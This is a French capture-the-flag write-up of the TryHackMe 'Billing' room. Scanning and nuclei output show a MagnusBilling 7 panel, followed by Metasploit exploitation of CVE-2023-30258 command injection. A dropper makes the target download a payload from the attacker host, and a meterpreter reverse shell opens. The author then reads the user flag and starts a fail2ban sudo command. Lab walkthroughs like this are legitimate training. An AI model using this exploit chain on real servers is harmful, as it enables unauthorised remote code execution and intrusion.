# BILLING - TRY HACK ME ROOM

- Difficulty : easy
- Adresse IP : 10.82.148.53
- Instruction : Some mistakes can be costly.

## 1 - RECONNAISSANCE 

on va utiliser rustscan et nmap pour le scan active

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack
5038/tcp open  unknown syn-ack

On a également une indice montrant un site qui utilise magnus billing system, on va donc essayer d'enumérer davantage pour continuer notre reconnaissance avec 
dirsearch et nuclei 

nuclei -u http://10.82.148.53 -tags tech-detect -v
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/billing$ nuclei -u http://10.82.148.53 -t http/default-logins/magnusbilling/magnusbilling-default-login.yaml -v

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.11.1

		projectdiscovery.io

[INF] Nuclei Config Directory: /home/kryptonite/.config/nuclei
[INF] Nuclei Cache Directory: /home/kryptonite/.cache/nuclei
[INF] PDCP Directory: /home/kryptonite/.pdcp
[VER] Started metrics server at localhost:9092
[VER] Saved 13897 templates to metadata cache
[INF] Current nuclei version: v3.11.1 (latest)
[INF] Current nuclei-templates version: v10.5.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 68
[INF] Templates loaded for current scan: 1
[INF] Executing 1 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[VER] [magnusbilling-default-login] Sent HTTP request to http://10.82.148.53/mbilling/index.php/authentication/login
[INF] Scan completed in 872.252212ms. No results found.
[INF] HTTP connections: 1 total, 1 new, 0 reused (0.0%)
[INF] HTTP connections [10.82.148.53]: 1 total, 1 new, 0 reused (0.0%)
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/billing$ 
 

et avec kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/billing$ nuclei -u http://10.82.148.53 -t http/exposed-panels/mbilling-panel.yaml -v

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.11.1

		projectdiscovery.io

[INF] Nuclei Config Directory: /home/kryptonite/.config/nuclei
[INF] Nuclei Cache Directory: /home/kryptonite/.cache/nuclei
[INF] PDCP Directory: /home/kryptonite/.pdcp
[VER] Started metrics server at localhost:9092
[VER] Saved 13897 templates to metadata cache
[INF] Current nuclei version: v3.11.1 (latest)
[INF] Current nuclei-templates version: v10.5.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 68
[INF] Templates loaded for current scan: 1
[INF] Executing 1 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[VER] [mbilling-panel] Sent HTTP request to http://10.82.148.53/mbilling/
[mbilling-panel] [http] [info] http://10.82.148.53/mbilling/
[INF] Scan completed in 664.920758ms. 1 matches found.
[INF] HTTP connections: 1 total, 1 new, 0 reused (0.0%)
[INF] HTTP connections [10.82.148.53]: 1 total, 1 new, 0 reused (0.0%)
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/billing$ 

Notre hypothèse est confirmé 


kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/billing$ curl -sS -i http://10.82.148.53/mbilling/README.md
HTTP/1.1 200 OK
Date: Thu, 29 Oct 2026 00:29:55 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Tue, 27 Feb 2024 19:44:25 GMT
ETag: "7cb-6126240e35840"
Accept-Ranges: bytes
Content-Length: 1995
Content-Type: text/markdown

###############
MagnusBilling 7 
###############

Do you like this software? Star the project and become a [stargazer](https://github.com/magnussolution/magnusbilling7/stargazers).


# MagnusBilling 7

Voip sistem to Asterisk.

## Getting Started

Video:

* [How to install MagnusBilling](https://www.youtube.com/watch?v=X3cj-dZPZHU)
* [How to set-up basic configuration and make your first call](https://www.youtube.com/watch?v=7r1XCJnfdZA&t=73s)

### Prerequisites

Linux Debian 11 or Centos 7. Recomended DEBIAN 11


### Installing
```

curl -O https://raw.githubusercontent.com/magnussolution/magnusbilling7/source/script/install.sh
bash install.sh

```


## Built With

* [YiiFramework](http://www.yiiframework.com) - The BackEnd framework used
* [EXTJS6](https://www.sencha.com/products/extjs) - The FrontEnd framework used
* [ASTERISK](http://www.asterisk.org) - Telephone freamwork

## Contributing

Please read [CONTRIBUTING.md](https://github.com/magnussolution/magnusbilling7/blob/source/CONTRIBUTING.md) for details on our code of conduct, and the process for submitting pull requests to us.

## Versioning

We are in MagnusBilling version 7.x.x 

## Authors

On a donc maintenant notre version , qui est vulnérable au cve_2023_30258 avec une commande injection. Avec metasploit, on a pu établir un reverse shell
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set SRVPORT 8081
SRVPORT => 8081
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 192.168.130.110:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.82.148.53:80 can be exploited.
[*] Sending stage (3106788 bytes) to 10.82.148.53
[-] Meterpreter session 31 is not valid and will be closed
[*] 10.82.148.53 - Meterpreter session 31 closed.
[*] Performing command injection test issuing a sleep command of 4 seconds.
[*] Sending stage (3106788 bytes) to 10.82.148.53
[-] Meterpreter session 32 is not valid and will be closed
[*] 10.82.148.53 - Meterpreter session 32 closed.
[*] 10.82.148.53 - Meterpreter session 32 closed.  Reason: Died
[*] Sending stage (3106788 bytes) to 10.82.148.53
[*] Elapsed time: 4.68 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Using URL: http://192.168.130.110:8081/Fe7J0S
[*] Client 10.82.148.53 (Wget/1.21.3) requested /Fe7J0S
[*] Sending payload to 10.82.148.53 (Wget/1.21.3)
[*] Sending stage (3106788 bytes) to 10.82.148.53
[*] Meterpreter session 33 opened (192.168.130.110:4444 -> 10.82.148.53:43854) at 2026-10-29 04:03:53 +0300
[*] Command Stager progress - 100.00% done (114/114 bytes)
[*] Server stopped.

meterpreter > id
[-] Unknown command: id. Run the help command for more details.
meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 4040 created.
Channel 1 created.
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
whoami
asterisk
ls /home  
debian
magnus
ssm-user
ls /home/magnus
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat /home/magnus/user.txt
THM{4a6831d5f124b25eefb1e92e0f0da4ca}

sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5

